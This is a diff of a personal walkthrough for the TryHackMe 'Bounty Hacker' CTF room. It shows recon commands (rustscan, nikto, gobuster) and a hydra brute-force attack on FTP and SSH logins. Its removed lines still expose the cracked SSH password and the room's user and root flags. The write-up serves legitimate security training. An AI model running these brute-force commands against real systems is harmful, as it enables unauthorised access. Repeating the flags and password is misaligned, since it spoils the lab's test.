@@ -2,10 +2,11 @@
 
 # bounty hunter
 
-"You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!"" Easy level CTF
+"You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!" 
+Easy level CTF
 
 ## nmap (rustscan)
-
+Saw this on a John Hammond walk through, so I have been trying it out. Seems faster but I still need ot review the switches (as it sits on top of nmap - there should not be much difference.
 ```
 ~/CTF/tryhackme/bounty_hunter$ rustscan $IP --ulimit 5000
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -90,7 +91,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 45.74 seconds
 ```
 ## nikto
-
 ```
 ~/CTF/tryhackme/bounty_hunter$ nikto -h $IP
 - Nikto v2.1.6
@@ -117,7 +117,6 @@ Nmap done: 1 IP address (1 host up) scanned in 45.74 seconds
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-
 ## gobuster
 ```
 ~/CTF/tryhackme/bounty_hunter$ gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
@@ -200,7 +199,7 @@ I did a few checks on the crew.jpg, each not finding anything. I even tried steg
 2. Stegsolve - nothing
 2. Exiftools - nothing
 2. Strings - nothing
-2. Stegcraker - running in the background
+2. Stegcraker - it was running in the background but nothing came form it by the time I had closed the room.
 
 ## ftp
 As we saw in the port scan we have an anonymous ftp that we should check out.
@@ -273,10 +272,10 @@ The next file, task.txt.
 
 -lin
 ```
-OK from this nothing that jumps out, however we may have another possible user.
+OK from this nothing that jumps out, however we may have another possible user, which I will add to my list..
 
 ## hydra
-Lets try ftp first and see if it gets us anywhere. I created a user list file for simplicity.
+Lets try ftp first and see if it gets us anywhere. I created a user list, taken from above as well as adding Lin, for simplicity in the attack.
 ```
 /CTF/tryhackme/bounty_hunter$ hydra -L user_list.txt -P locks.txt ftp://$IP
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -296,7 +295,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-07 08:58:
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 20 tasks per 1 server, overall 20 tasks, 182 login tries (l:7/p:26), ~10 tries per task
 [DATA] attacking ssh://10.10.137.143:22/
-[22][ssh] host: 10.10.137.143   login: lin   password: RedDr4gonSynd1cat3
+[22][ssh] host: 10.10.137.143   login: lin   password: <insert-user-password-here>
 1 of 1 target successfully completed, 1 valid password found
 [WARNING] Writing restore file because 2 final worker threads did not complete until end.
 [ERROR] 2 targets did not resolve or could not be connected
@@ -329,7 +328,7 @@ OK Now lets look around.
 lin@bountyhacker:~/Desktop$ ls
 user.txt
 lin@bountyhacker:~/Desktop$ cat user.txt 
-THM{CR1M3_SyNd1C4T3}
+THM{<insert-user-flag-here>}
 ```
 If I am honest I then did the sudo -l check and when it asked for the password, I forgot that I had it. I then spent 20 minutes figuring out what to do. Checked for SUID bits, had a look around the machine, and the lightbulb moment that I needed, came AFTER I found the .ssh file. I thought "I'll use that to get a proper login", which is where I remembered I actually have the bloody password in the first place.
 Now with my password, the rest was smooth going.
@@ -355,14 +354,14 @@ Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
 # ls
 root.txt
 # cat root.txt	
-THM{80UN7Y_h4cK3r}
+THM{<insert-root-flag-here>}
 # 
 ```
 I really enjoyed this CTF. Nice story, TBH I was put off a little by the title as I didn't think that I would be good enough to do it, but more and more I'm finding as long as you are methodical and follow a plan, things work out.
 
-This room was created by ![Sevuhl](https://tryhackme.com/p/Sevuhl) and one I really enjoyed.
+This room was created by [Sevuhl](https://tryhackme.com/p/Sevuhl) and one I really enjoyed.
 
-Thanks Sevuhl. :)
+Thanks Sevuhl for your time.
 
 Regards
 
